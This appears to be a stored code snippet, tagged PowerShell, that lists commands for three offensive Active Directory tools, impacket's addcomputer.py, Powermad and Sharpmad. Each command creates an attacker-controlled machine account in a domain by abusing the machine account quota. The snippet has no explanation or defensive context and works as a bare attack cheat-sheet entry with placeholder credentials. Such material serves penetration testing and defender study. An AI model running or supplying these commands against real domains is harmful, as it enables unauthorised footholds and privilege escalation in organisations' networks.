---
id: 6e1715f2-90be-49a8-bbd9-a3f5665bcd19
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:03.096068+00:00'
updated_at: '2023-04-10T20:26:11.554516+00:00'
---

# Code Snippet 6e1715f2

**Language**: Powershell

```powershell
impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

powermad@windows> . .\Powermad.ps1
powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword
```


